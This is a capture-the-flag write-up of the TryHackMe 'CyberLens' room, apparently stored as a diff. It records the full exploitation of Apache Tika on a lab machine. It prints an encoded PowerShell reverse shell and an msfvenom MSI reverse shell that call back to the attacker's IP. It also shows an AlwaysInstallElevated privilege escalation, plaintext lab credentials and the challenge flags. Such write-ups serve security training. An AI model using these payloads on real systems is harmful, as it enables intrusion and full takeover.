@@ -1,0 +1,315 @@
+-------------CYBERLENS TRUHACKME ----------
+Date: 18/09/2024 
+Dns: cyberlens.thm
+Link: https://tryhackme.com/r/room/cyberlensp6
+
+
+**Port scann and enumeration
+--> rustscan -a cyberlens.thm -- -A -sV -sC -O -Pn
+Open 10.10.128.27:80 --> HTTP
+Open 10.10.128.27:139
+Open 10.10.128.27:135
+Open 10.10.128.27:445
+Open 10.10.128.27:3389 --> RDP
+Open 10.10.128.27:5985
+Open 10.10.128.27:7680
+Open 10.10.128.27:47001
+Open 10.10.128.27:49664
+Open 10.10.128.27:49665
+Open 10.10.128.27:49669
+Open 10.10.128.27:49668
+Open 10.10.128.27:49670
+Open 10.10.128.27:49667
+Open 10.10.128.27:49666
+Open 10.10.128.27:49675
+Open 10.10.128.27:61777 --> HTTP
+
+For ports which interess us we have put service in front-of
+
+
+**Port 80 exploitation
+-->gobuster dir -u http://cyberlens.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cyberlens.thm/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/images/]
+/css                  (Status: 301) [Size: 233] [--> http://cyberlens.thm/css/]
+/js                   (Status: 301) [Size: 232] [--> http://cyberlens.thm/js/]
+
+We just found these 3 directory but nothing else. We search in images directory but nothing.
+
+**Port 61777 Exploitation
+Try first to access to it and see what we will see.
+Title: Welcome to the Apache Tika 1.17 Server
+
+so we will try to see if we found exploit about tika on metasploit and searchsploit. First startt with the second one. If oit works it will be more easy.
+
+-->searchsploit tika                                   
+-------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                |  Path
+-------------------------------------------------------------- ---------------------------------
+Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploi | windows/remote/47208.rb
+Apache Tika-server < 1.18 - Command Injection                 | windows/remote/46540.py
+Joomla! Component com_cartikads 1.0 - Arbitrary File Upload   | php/webapps/10984.txt
+Mitra Informatika Solusindo cart - SQL Injection              | php/webapps/5214.txt
+-------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+We don't found a shell code so we will go and search it on metasploit.
+msf6 > search tika
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/windows/http/apache_tika_jp2_jscript         2018-04-25       excellent  Yes    Apache Tika Header Command Injection
+   1  post/linux/gather/puppet                             .                normal     No     Puppet Config Gather
+   2  auxiliary/scanner/http/wp_gimedia_library_file_read  .                normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability
+   
+   
+We will try with 0 to see if we can abuse this and get unauthorised access to the machine.
+
+
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rport 61777
+rport => 61777
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rhosts cyberlens.thm
+rhosts => cyberlens.thm
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > set lhost tun0
+lhost => 10.2.9.70
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > run
+
+
+[*] Started reverse TCP handler on 10.2.9.70:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[REACTED]
+[*] Meterpreter session 1 opened (10.2.9.70:4444 -> 10.10.128.27:49858) at 2024-09-17 12:14:52 -0400
+
+meterpreter > 
+
+After getting a meterpreter, we use shell command to navigate better into the system and read user flag
+
+C:\Users\CyberLens\Desktop>type user.txt
+type user.txt
+THM{T1k4-CV3-f0r-7h3-w1n}
+C:\Users\CyberLens\Desktop>
+
+
+***********Privilege escalation******
+We come back into cyberlens and do recursive tree to see if we have any interesting file. 
+C:\Users\CyberLens>tree /f
+tree /f
+Folder PATH listing
+Volume serial number is A8A4-C362
+C:.
+����3D Objects
+����Contacts
+����Desktop
+�       EC2 Feedback.website
+�       EC2 Microsoft Windows Guide.website
+�       user.txt
+�       
+����Documents
+�   ����Management
+�           CyberLens-Management.txt
+�           
+����Downloads
+����Favorites
+�   �   Bing.url
+�   �   
+�   ����Links
+����Links
+�       Desktop.lnk
+�       Downloads.lnk
+�       
+����Music
+����Pictures
+����Saved Games
+����Searches
+����Videos
+
+C:\Users\CyberLens>
+
+Bingo we see that we have the management file into documents . We will access to it and see wht it contains.
+
+C:\Users\CyberLens\Documents\Management>type CyberLens-Management.txt
+type CyberLens-Management.txt
+Remember, manual enumeration is often key in an engagement ;)
+
+CyberLens
+HackSmarter123
+C:\Users\CyberLens\Documents\Management>
+
+I think we have a username and password so we will try to do RDP with the command:
+-->xfreerdp /u:CyberLens /p:HackSmarter123 /cert:ignore /v:cyberlens.thm /workarea /tls-seclevel:0 /timeout:80000
+
+we connect to it and try to access to the Admin directory but it was impossible.
+We will turn back to searchsploit exploit to see if we are not able to found something good in them. 
+
+searchsploit -m windows/remote/46540.py
+  Exploit: Apache Tika-server < 1.18 - Command Injection
+      URL: https://www.exploit-db.com/exploits/46540
+     Path: /usr/share/exploitdb/exploits/windows/remote/46540.py
+    Codes: CVE-2018-1335
+ Verified: True
+File Type: Python script, ASCII text executable
+Copied to: /home/kali/Desktop/rooms/cyberlens/46540.py
+
+we will see how to use it.
+
+We will type the command adding powershell base64 reverse shell to access to machine
+
+-->python2.7 46540.py cyberlens.thm 61777 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAuADkALgA3ADAAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
+
+After running this command we get a reverse shell on our listening port 1234
+
+lwrap nc -lvnp 1234                          
+listening on [any] 1234 ...
+connect to [10.2.9.70] from (UNKNOWN) [10.10.128.27] 49964
+whoami
+cyberlens\cyberlens
+PS C:\Windows\system32> 
+
+Here we are in powershell. so we will try to see if we have any antivirus or protection mechanism on the host using the command :
+
+PS C:\Windows\system32> Get-MpComputerStatus
+
+
+AMEngineVersion                  : 0.0.0.0
+AMProductVersion                 : 4.18.23050.3
+AMRunningMode                    : Not running
+AMServiceEnabled                 : False
+AMServiceVersion                 : 0.0.0.0
+AntispywareEnabled               : False
+AntispywareSignatureAge          : 4294967295
+AntispywareSignatureLastUpdated  : 
+AntispywareSignatureVersion      : 0.0.0.0
+AntivirusEnabled                 : False
+AntivirusSignatureAge            : 4294967295
+AntivirusSignatureLastUpdated    : 
+AntivirusSignatureVersion        : 0.0.0.0
+BehaviorMonitorEnabled           : False
+ComputerID                       : 3DBFE4F2-4B29-4FF5-531E-E6C7CDAE6B2E
+ComputerState                    : 0
+DefenderSignaturesOutOfDate      : False
+DeviceControlDefaultEnforcement  : N/A
+DeviceControlPoliciesLastUpdated : 1/1/1601 12:00:00 AM
+DeviceControlState               : N/A
+FullScanAge                      : 4294967295
+FullScanEndTime                  : 
+FullScanOverdue                  : False
+FullScanRequired                 : False
+FullScanSignatureVersion         : 
+FullScanStartTime                : 
+IoavProtectionEnabled            : False
+IsTamperProtected                : False
+IsVirtualMachine                 : True
+LastFullScanSource               : 0
+LastQuickScanSource              : 0
+NISEnabled                       : False
+NISEngineVersion                 : 0.0.0.0
+NISSignatureAge                  : 4294967295
+NISSignatureLastUpdated          : 
+NISSignatureVersion              : 0.0.0.0
+OnAccessProtectionEnabled        : False
+ProductStatus                    : 1
+QuickScanAge                     : 4294967295
+QuickScanEndTime                 : 
+QuickScanOverdue                 : False
+QuickScanSignatureVersion        : 
+QuickScanStartTime               : 
+RealTimeProtectionEnabled        : False
+RealTimeScanDirection            : 0
+RebootRequired                   : False
+SmartAppControlExpiration        : 
+SmartAppControlState             : 
+TamperProtectionSource           : N/A
+TDTMode                          : N/A
+TDTSiloType                      : N/A
+TDTStatus                        : N/A
+TDTTelemetry                     : N/A
+TroubleShootingDailyMaxQuota     : 
+TroubleShootingDailyQuotaLeft    : 
+TroubleShootingEndTime           : 
+TroubleShootingExpirationLeft    : 
+TroubleShootingMode              : 
+TroubleShootingModeSource        : 
+TroubleShootingQuotaResetTime    : 
+TroubleShootingStartTime         : 
+PSComputerName                   : 
+
+
+
+PS C:\Windows\system32> 
+
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.128.27 - - [17/Sep/2024 12:48:46] "GET /PrivescCheck.ps1 HTTP/1.1" 200 -
+
+
+PS C:\Windows\system32> curl http://10.2.9.70/PrivescCheck.ps1 -o PrivescCheck.ps1
+
+After getting the file we have to execute it with the command: 
+-->. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
+
+PS C:\users> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+PS C:\users> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+PS C:\users> 
+
+
+
+So after that we will make our reverse shell with msvenon
+
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.9.70 LPORT=1234 -a x64 --platform Windows -f msi -o rev.msi
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: rev.msi
+
+
+PS C:\users\cyberlens\desktop> wget http://10.2.9.70:8000/rev.msi -o tev.msi
+
+PS C:\users\cyberlens\desktop> ./tev.msi
+
+Bingoooo on accede avec le port 1234 open.
+
+rlwrap nc -lvnp 1234    
+listening on [any] 1234 ...
+connect to [10.2.9.70] from (UNKNOWN) [10.10.128.27] 49986
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+C:\Users\Administrator\Desktop>type admin.txt
+
+type admin.txt
+THM{3lev@t3D-4-pr1v35c!}
+C:\Users\Administrator\Desktop>
+C:\Users\Administrator\Desktop>
+
+
+Thank you for reading my opinion of the room @petstar from togo
